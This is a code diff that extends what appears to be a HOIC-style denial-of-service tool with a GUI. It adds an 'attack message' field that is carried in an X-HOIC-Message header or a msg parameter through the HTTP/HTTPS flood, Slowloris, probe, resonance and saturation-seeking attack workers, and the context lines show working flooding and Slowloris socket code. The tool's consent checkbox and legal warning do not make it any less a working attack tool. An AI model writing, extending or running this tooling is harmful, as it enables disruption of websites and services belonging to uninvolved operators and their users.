@@ -91,6 +91,14 @@ ATTACK_MODES = [
     "Adaptive Saturation Seeker",
 ]
 
+MESSAGE_SUPPORTED_MODES = {
+    "HTTP Flood",
+    "HTTPS Flood",
+    "Slowloris (HTTP)",
+    "Mixed (HTTP + UDP)",
+    "Adaptive Saturation Seeker",
+}
+
 
 @dataclass
 class AttackConfig:
@@ -109,6 +117,7 @@ class AttackConfig:
     saturation_error_threshold: float = 0.10
     saturation_latency_p95_ms: float = 2000.0
     resonance_period: float = 12.0
+    attack_message: str = ""
 
 
 # ============================================================
@@ -120,8 +129,18 @@ def make_payload(size: int) -> bytes:
     return os.urandom(max(1, size))
 
 
-def build_random_headers(host: str) -> dict:
-    return {
+def mode_supports_message(mode: str) -> bool:
+    return mode in MESSAGE_SUPPORTED_MODES
+
+
+def sanitize_http_header_value(value: str, max_len: int = 256) -> str:
+    """Strip control chars/newlines for safe HTTP header embedding."""
+    cleaned = "".join(c for c in value if c.isprintable() and c not in "\r\n")
+    return cleaned[:max_len].strip()
+
+
+def build_random_headers(host: str, message: str = "") -> dict:
+    headers = {
         "User-Agent": random.choice(USER_AGENTS),
         "Accept": random.choice(["*/*", "text/html,application/xhtml+xml", "application/json"]),
         "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.7,en;q=0.3"]),
@@ -130,6 +149,25 @@ def build_random_headers(host: str) -> dict:
         "Cache-Control": random.choice(["no-cache", "max-age=0"]),
         "Host": host,
     }
+    return apply_message_to_headers(headers, message)
+
+
+def apply_message_to_headers(headers: dict, message: str) -> dict:
+    msg = sanitize_http_header_value(message)
+    if not msg:
+        return headers
+    updated = headers.copy()
+    updated["X-HOIC-Message"] = msg
+    return updated
+
+
+def apply_message_to_params(params: dict, message: str) -> dict:
+    msg = sanitize_http_header_value(message)
+    if not msg:
+        return params
+    updated = params.copy()
+    updated["msg"] = msg
+    return updated
 
 
 def compute_error_rate(sent: int, errors: int) -> float:
@@ -295,6 +333,8 @@ class AttackController:
 
         self.log_msg(f"Starting {cfg.mode} against {cfg.target_host}:{cfg.target_port}")
         self.log_msg(f"Workers: {cfg.workers} | Duration: {cfg.duration}s | Packet size: {cfg.packet_size}")
+        if cfg.attack_message and mode_supports_message(cfg.mode):
+            self.log_msg(f"Attack message: {sanitize_http_header_value(cfg.attack_message)}")
 
         if cfg.mode in ("HTTP Flood", "HTTPS Flood"):
             self._start_http(cfg)
@@ -380,7 +420,7 @@ class AttackController:
         timeout = aiohttp.ClientTimeout(total=cfg.timeout)
 
         async def worker(wid: int):
-            headers_base = build_random_headers(cfg.target_host)
+            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                 while not self.stop_event.is_set():
                     try:
@@ -395,7 +435,10 @@ class AttackController:
                             async with session.post(url, headers=h, data=data) as resp:
                                 await resp.read()
                         else:
-                            params = {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)}
+                            params = apply_message_to_params(
+                                {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
+                                cfg.attack_message,
+                            )
                             async with session.get(url, headers=h, params=params) as resp:
                                 await resp.read()
 
@@ -504,7 +547,7 @@ class AttackController:
 
         async def probe_worker(wid: int):
             nonlocal sent, errors
-            headers_base = build_random_headers(cfg.target_host)
+            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                 while not stop.is_set() and not self.stop_event.is_set():
                     if time.time() >= end_at:
@@ -513,7 +556,10 @@ class AttackController:
                         h = headers_base.copy()
                         h["X-HOIC-Probe"] = f"{wid}-{random.randint(1000, 999999)}"
                         t0 = time.perf_counter()
-                        params = {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)}
+                        params = apply_message_to_params(
+                            {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
+                            cfg.attack_message,
+                        )
                         async with session.get(url, headers=h, params=params) as resp:
                             await resp.read()
                         latencies.append((time.perf_counter() - t0) * 1000)
@@ -559,14 +605,17 @@ class AttackController:
         task_id = 0
 
         async def resonance_worker(wid: int):
-            headers_base = build_random_headers(cfg.target_host)
+            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                 while not self.stop_event.is_set() and time.time() < end_at:
                     try:
                         h = headers_base.copy()
                         h["X-HOIC-Resonance"] = f"{wid}-{random.randint(1000, 999999)}"
                         t0 = time.perf_counter()
-                        params = {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)}
+                        params = apply_message_to_params(
+                            {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
+                            cfg.attack_message,
+                        )
                         async with session.get(url, headers=h, params=params) as resp:
                             await resp.read()
                         self.stats.record_latency((time.perf_counter() - t0) * 1000)
@@ -683,6 +732,9 @@ class AttackController:
                             s.send(("User-Agent: " + random.choice(USER_AGENTS) + "\r\n").encode())
                             s.send(b"Accept: */*\r\n")
                             s.send(b"Connection: Keep-Alive\r\n")
+                            msg = sanitize_http_header_value(cfg.attack_message)
+                            if msg:
+                                s.send(f"X-HOIC-Message: {msg}\r\n".encode())
                             sockets.append(s)
                             self.stats.record_sent()
                         except Exception:
@@ -733,6 +785,7 @@ class AttackController:
             duration=cfg.duration,
             packet_size=cfg.packet_size,
             use_https=use_http_ssl,
+            attack_message=cfg.attack_message,
         )
         self._start_http(http_cfg)
 
@@ -880,6 +933,19 @@ class HOICApp:
         self.size_entry.pack(anchor="w", padx=12, pady=2)
         self.size_entry.insert(0, "1400")
 
+        self.message_label = ctk.CTkLabel(
+            left,
+            text="ATTACK MESSAGE (HTTP modes only)",
+            font=ctk.CTkFont(size=13),
+        )
+        self.message_label.pack(anchor="w", padx=12, pady=(8, 0))
+        self.message_entry = ctk.CTkEntry(
+            left,
+            placeholder_text="Custom message sent as X-HOIC-Message header",
+            width=260,
+        )
+        self.message_entry.pack(padx=12, pady=2)
+
         self.consent_var = tk.BooleanVar(value=False)
         self.consent_cb = ctk.CTkCheckBox(
             left,
@@ -993,6 +1059,31 @@ class HOICApp:
             footer, text="Windows + Linux", font=ctk.CTkFont(size=10), text_color="#555555"
         ).pack(side="right")
 
+        self._update_message_field_state(self.mode_var.get())
+
+    def _update_message_field_state(self, mode: str):
+        supported = mode_supports_message(mode)
+        if supported:
+            self.message_entry.configure(
+                state="normal",
+                text_color=("gray10", "gray90"),
+                placeholder_text="Custom message sent as X-HOIC-Message header",
+            )
+            self.message_label.configure(
+                text="ATTACK MESSAGE (HTTP modes only)",
+                text_color=("gray10", "gray90"),
+            )
+        else:
+            self.message_entry.configure(
+                state="disabled",
+                text_color="#666666",
+                placeholder_text="Not available for UDP/TCP flood modes",
+            )
+            self.message_label.configure(
+                text="ATTACK MESSAGE (not supported for this mode)",
+                text_color="#666666",
+            )
+
     def show_legal_warning(self):
         result = messagebox.askokcancel(
             "HOIC Legal Warning",
@@ -1015,6 +1106,7 @@ class HOICApp:
                 "Saturation Seeker: workers slider sets max search bound; "
                 "duration should allow probe + resonance phases (60s+ recommended)"
             )
+        self._update_message_field_state(choice)
 
     def resolve_target(self):
         host = self.target_entry.get().strip()
@@ -1076,6 +1168,7 @@ class HOICApp:
                     "workers": cfg.workers if cfg else int(self.workers_slider.get()),
                     "duration": cfg.duration if cfg else self._parse_port(self.duration_entry.get(), 0),
                     "packet_size": cfg.packet_size if cfg else self._parse_port(self.size_entry.get(), 1024),
+                    "attack_message": cfg.attack_message if cfg else "",
                 } if cfg else {},
                 "stats": {
                     "sent": stats.get("sent", 0),
@@ -1183,6 +1276,9 @@ class HOICApp:
         use_https = "HTTPS" in mode or (
             mode == "Adaptive Saturation Seeker" and port == 443
         )
+        attack_message = ""
+        if mode_supports_message(mode):
+            attack_message = self.message_entry.get().strip()
 
         return AttackConfig(
             target_host=host,
@@ -1194,6 +1290,7 @@ class HOICApp:
             use_https=use_https,
             path="/",
             method="GET",
+            attack_message=attack_message,
         )
 
     def start_attack(self):
